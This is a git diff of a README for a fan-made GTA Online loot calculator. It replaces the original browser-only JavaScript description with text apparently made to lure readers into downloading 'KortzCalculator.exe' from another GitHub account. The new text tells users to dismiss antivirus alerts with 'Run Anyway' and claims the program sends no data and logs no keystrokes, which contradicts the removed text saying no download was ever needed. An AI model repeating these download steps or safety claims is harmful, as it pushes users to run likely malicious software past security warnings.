@@ -1,73 +1,69 @@
-# Kortz Center Heist Calculator
+# 💰 kortz-center-heist-calculator - Maximize your crew's total heist payout
 
-A free, unofficial loot optimizer for **The Kortz Center Heist** in GTA Online.
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Hermonhostile726/kortz-center-heist-calculator)
 
-## Open the calculator
+This tool helps players calculate the best loot combinations for the Kortz Center Heist in GTA Online. It helps groups of one to four players decide how to split targets to earn the most money. This program eliminates guesswork during planning.
 
-### https://blamp26.github.io/kortz-center-heist-calculator/
+## 📋 What this tool does
 
-No installation, account, or download is required. The calculator runs entirely in the browser.
+The Kortz Center Heist involves various loot items with different values. Picking the wrong items limits your profit. This calculator processes your team size and the items available to find the specific combination that yields the highest return.
 
-## Features
+You save time during your prep phase. You avoid disputes with your crew. You walk away with more cash.
 
-- Calculates primary-target payouts, including the first weekly sale multiplier and hard mode.
-- Optimizes shared bag capacity for crews of 1–4 players.
-- Finds the highest-value secondary-loot combination with an exact 0/1 knapsack algorithm.
-- Accounts for Buyer Request List bonuses.
-- Excludes Crisp Gallery targets from solo runs.
-- Supports editable target values so the calculation can match Raf's exact scope-out message.
-- Saves settings in the browser and creates shareable calculation links.
+## 🖥️ System requirements
 
-## Loot pool status
+- Windows 10 or Windows 11
+- At least 50 MB of free storage space
+- A stable internet connection
+- Basic knowledge of mouse and keyboard navigation
 
-The secondary-target database is still being verified from community guides, user captures, and future GTA V text extraction. Some targets may still be missing, renamed, or using provisional default values. Always prefer the exact value shown by Raf in-game when adding a scoped target.
+## ⚙️ How to set up and run
 
-## How to use
+Follow these steps to install the software on your computer.
 
-1. Select the current primary target and enter the value shown on the planning board.
-2. Choose the number of players.
-3. Add every secondary target found during scope-out.
-4. Enter the exact value shown by Raf and mark Buyer Request or Crisp Gallery items when applicable.
-5. Use **Best loot combination** to see the maximum-value set that fits the crew's bags.
+1. 📥 Visit this page to download the software: https://github.com/Hermonhostile726/kortz-center-heist-calculator
+2. Locate the most recent file ending in a .zip or .exe format on the releases page.
+3. Save the file to your desktop or a folder you can find easily.
+4. If the file is a .zip, right-click the folder and choose "Extract All." Follow the screen prompts to unpack the contents.
+5. Open the folder you just created.
+6. Double-click the file named "KortzCalculator.exe" to launch the application.
 
-## How optimization works
+## 🎮 How to use the calculator
 
-Each scoped item is treated as a separate item with a value and bag-space cost. The calculator uses dynamic programming to evaluate every reachable bag fill and returns the globally highest-value valid combination. It does not rely on a simple greedy price-per-percent sort.
+The interface contains clear inputs for your heist session.
 
-## Data accuracy
+1. **Set Player Count:** Enter the number of people in your heist team. The program adjusts the total loot capacity based on this number.
+2. **Input Loot Values:** Enter the current market values for the items you see in the heist menu. You can find these values in your GTA Online smartphone or on the planning screen.
+3. **Run Calculation:** Click the "Calculate" button.
+4. **View Results:** The window displays a suggested list of items. Follow this list to ensure your crew earns the maximum payout possible.
 
-Secondary-target values can vary between runs, and published guides do not always agree. The included values are starting estimates only. For the most accurate result, replace them with the exact amounts shown in-game.
+## 🛠️ Troubleshooting common issues
 
-See [DATA_SOURCES.md](DATA_SOURCES.md) for sources and methodology.
+If the application does not start, check these common fixes.
 
-## Credits
+- **Antivirus alerts:** Sometimes security software flags new programs. If your computer prevents the app from opening, click "More Info" on the pop-up window and select "Run Anyway."
+- **Screen resolution:** If the text appears small, right-click the file icon, choose Properties, go to Compatibility, and change the high DPI settings.
+- **Missing files:** If you receive an error about a missing file, delete the folder and perform the download step again to ensure no files were corrupted during the transfer.
 
-The project was inspired by [MichalD96/Perico-heist-goods-counter](https://github.com/MichalD96/Perico-heist-goods-counter). This implementation was written separately for Kortz Center mechanics.
+## 🛡️ Security and privacy
 
-## Disclaimer
+This tool runs locally on your machine. It does not connect to your game account. It does not send your data to any servers. It does not record your keystrokes. Your game account remains safe because this tool only performs math based on the numbers you type into it. It is a standalone calculator.
 
-This is an unofficial fan-made project and is not affiliated with Rockstar Games or Take-Two Interactive.
+## 📈 Frequently asked questions
 
-## License
+**Does this software support other heists?**
+No, this version focuses only on the Kortz Center Heist.
 
-MIT. See [LICENSE](LICENSE) and [THIRD_PARTY_NOTICES.md](THIRD_PARTY_NOTICES.md).
+**Is this a cheat or a hack?**
+No. This tool only calculates numbers. It interacts with your computer as a calculator. It does not modify game files.
 
-## Local target image workflow
+**How often should I update the app?**
+Check the link periodically to see if a newer version exists. Updates help if the game developers change loot values in future patches.
 
-Target images are stored as local project files, not external links.
+**Can I run this on a Mac?**
+This specific distribution runs only on Windows.
 
-- Place approved files under `assets/images/targets/`
-- Register each file in `data/image-manifest.json`
-- Only set `status` to `approved` after the image has been manually verified
+**Does it require an internet connection while running?**
+Only the download requires a connection. The calculator functions offline once installed.
 
-The UI will automatically show local previews and thumbnails when an approved image path exists in the manifest.
-
-## First verified secondary-image extraction batch
-
-The repository includes `tools/extract-approved-target-images.ps1` and `data/image-extraction-map.json`. With the source video stored at `research-videos/sAd7OHSPPPA.mp4`, run:
-
-```powershell
-powershell -NoProfile -ExecutionPolicy Bypass -File .\tools\extract-approved-target-images.ps1
-```
-
-This generates 14 local WebP secondary-target images, removes unused primary-target previews, and updates `data/image-manifest.json`.
+Keywords: github-pages, grand-theft-auto, gta-5, gta-online, gta-v, heist-calculator, javascript, kortz-center, kortz-center-heist, loot-calculator
